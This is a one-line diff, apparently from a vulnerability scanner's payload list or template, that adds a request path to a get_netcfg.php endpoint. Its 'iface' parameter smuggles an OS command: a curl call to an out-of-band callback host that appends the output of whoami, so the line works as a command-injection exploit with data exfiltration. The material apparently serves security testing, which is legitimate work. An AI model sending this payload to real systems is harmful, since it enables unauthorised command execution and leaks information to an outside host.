@@ -1,0 +1,1 @@
+/ajax/networking/get_netcfg.php?iface=;curl%20{{interactsh-url}}/`whoami`;
